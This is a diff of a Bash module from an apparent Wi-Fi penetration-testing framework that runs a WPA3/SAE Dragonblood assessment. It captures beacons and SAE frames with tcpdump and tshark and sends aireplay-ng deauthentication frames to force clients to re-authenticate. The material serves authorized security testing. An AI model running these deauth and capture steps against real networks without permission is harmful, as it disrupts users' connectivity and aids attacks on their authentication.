@@ -35,8 +35,33 @@
 set -uo pipefail
 
 run_d4() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-0}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=7
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d4"
+    local evidence_prefix="${evidence_dir}/d4"
     local findings_file="${evidence_prefix}_findings.txt"
     local wpa3_analysis="${evidence_prefix}_wpa3_analysis.txt"
     local downgrade_file="${evidence_prefix}_downgrade_test.txt"
@@ -49,15 +74,18 @@ run_d4() {
 
     check_module_dependencies "D4" || return 1
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-0}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     #--- Warning banner ---
     echo ""
@@ -75,6 +103,7 @@ run_d4() {
     echo "  ╚════════════════════════════════════════════════════════════════════╝"
     echo -e "${C_RESET}"
     echo ""
+    local confirm=""
     get_or_request_param "confirm" "  Proceed with WPA3 Dragonblood testing? [Y/n]"
     [[ "${confirm,,}" == "n" ]] && return 1
 
@@ -89,7 +118,7 @@ run_d4() {
         echo "============================================================"
         echo "  D4: WPA3/SAE Dragonblood Attack"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "  CVEs: CVE-2019-9494 to CVE-2019-9498"
         echo "============================================================"
         echo ""
@@ -99,11 +128,12 @@ run_d4() {
     log_step 2 $total_steps "Analyzing AP for WPA3-SAE capabilities"
     update_tc_progress 2 $total_steps "WPA3 analysis"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" && "$channel" != "0" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     {
@@ -118,14 +148,14 @@ run_d4() {
     rm -f "$beacon_pcap"
     
     log_info "Capturing beacons for WPA3 analysis..."
-    run_fg "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -c 30 -w "$beacon_pcap" \
-        "type mgt subtype beacon and ether src ${GUEST_BSSID}" 2>/dev/null || true
+    run_fg --quiet timeout 15 tcpdump -i "$mon_iface" -c 30 -w "$beacon_pcap" \
+        "type mgt subtype beacon and ether src ${bssid}" 2>/dev/null || true
 
     if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
         # Check AKM suite for SAE (type 8 = SAE, type 24 = SAE-FT)
         local akm_types
-        akm_types=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" \
-            -Y "wlan.bssid == ${GUEST_BSSID}" \
+        akm_types=$(run_fg --quiet tshark -r "$beacon_pcap" \
+            -Y "wlan.bssid == ${bssid}" \
             -T fields \
             -e wlan.rsn.akms.type \
             2>/dev/null | head -1 || true)
@@ -151,12 +181,12 @@ run_d4() {
 
         # Check MFP (802.11w) — required for WPA3
         local mfpr mfpc
-        mfpc=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" \
-            -Y "wlan.bssid == ${GUEST_BSSID}" \
+        mfpc=$(run_fg --quiet tshark -r "$beacon_pcap" \
+            -Y "wlan.bssid == ${bssid}" \
             -T fields -e wlan.rsn.capabilities.mfpc \
             2>/dev/null | head -1 || true)
-        mfpr=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" \
-            -Y "wlan.bssid == ${GUEST_BSSID}" \
+        mfpr=$(run_fg --quiet tshark -r "$beacon_pcap" \
+            -Y "wlan.bssid == ${bssid}" \
             -T fields -e wlan.rsn.capabilities.mfpr \
             2>/dev/null | head -1 || true)
 
@@ -177,13 +207,13 @@ run_d4() {
     update_tc_progress 3 $total_steps "SAE capture"
 
     rm -f "$sae_pcap"
-    spawn_bg "sae_cap" "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -w "$sae_pcap" \
+    spawn_bg "sae_cap" "tcpdump" -i "$mon_iface" -w "$sae_pcap" \
         "type mgt subtype auth or type mgt subtype deauth or type mgt subtype assoc-req"
 
     # Send deauth to trigger re-authentication
     sleep 10
     log_info "Sending deauth to trigger SAE re-authentication..."
-    run_fg "${TOOL_PATHS[aireplay-ng]}" --deauth 5 -a "$GUEST_BSSID" "$mon_iface"
+    run_fg --quiet aireplay-ng --deauth 5 -a "$bssid" "$mon_iface"
 
     start_countdown 90 "Capturing SAE Commit/Confirm exchanges"
     sleep 80
@@ -206,7 +236,7 @@ run_d4() {
 
     if [[ -f "$sae_pcap" && -s "$sae_pcap" ]]; then
         local sae_frames
-        sae_frames=$(run_fg "${TOOL_PATHS[tshark]}" -r "$sae_pcap" \
+        sae_frames=$(run_fg --quiet tshark -r "$sae_pcap" \
             -Y "wlan.fixed.auth.alg == 3" \
             -T fields \
             -e frame.time_delta \
@@ -244,7 +274,7 @@ run_d4() {
             fi
 
             local groups_used
-            groups_used=$(run_fg "${TOOL_PATHS[tshark]}" -r "$sae_pcap" \
+            groups_used=$(run_fg --quiet tshark -r "$sae_pcap" \
                 -Y "wlan.fixed.auth.alg == 3 && wlan.fixed.auth.seq == 1" \
                 -T fields \
                 -e wlan.fixed.finite_cyclic_group \
@@ -259,7 +289,7 @@ run_d4() {
             fi
 
             local anticlog
-            anticlog=$(run_fg "${TOOL_PATHS[tshark]}" -r "$sae_pcap" \
+            anticlog=$(run_fg --quiet tshark -r "$sae_pcap" \
                 -Y "wlan.fixed.status_code == 76" \
                 2>/dev/null | wc -l || echo "0")
 
@@ -352,7 +382,7 @@ run_d4() {
     local is_secure=0
     [[ "$result_status" == "SECURE" ]] && is_secure=1
 
-    save_tc_result "D4" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
+    save_tc_result "D4" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 "$is_secure"
     save_session_state
 
     return 0
